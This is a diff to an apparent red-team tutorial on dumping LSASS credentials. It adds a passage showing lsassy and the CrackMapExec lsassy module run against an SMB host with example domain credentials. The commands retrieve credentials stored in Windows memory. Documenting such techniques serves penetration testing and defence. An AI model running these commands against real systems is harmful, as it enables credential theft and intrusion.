@@ -134,8 +134,16 @@ CrackMapExec uses Impacket's [secretsdump.py](https://github.com/SecureAuthCorp/
 └─$ lsassy -d secybr.com -u 0xhav0c -p Password123! 192.168.x.x
 ```
 
-![Getting LSASS dump with lsassy](/assets/img/pitcures/red-team/dumplsass14.png)
+![Getting LSASS dump with lsassy](/assets/img/pitcures/red-team/dumplsass13.png)
 _Getting LSASS dump with lsassy_
+
+Lsassy is also available in crackmapexec.
+
+```bash
+└─$ crackmapexec smb 192.168.x.x -u 0xhav0c -p Password123! -M lsassy
+```
+![Getting LSASS dump with Crackmapexec lsassy module.](/assets/img/pitcures/red-team/dumplsass14.png)
+_Getting LSASS dump with Crackmapexec lsassy module._
 
 The methods shown up to this section were for devices that hold hashes and plaintext credentials.
 
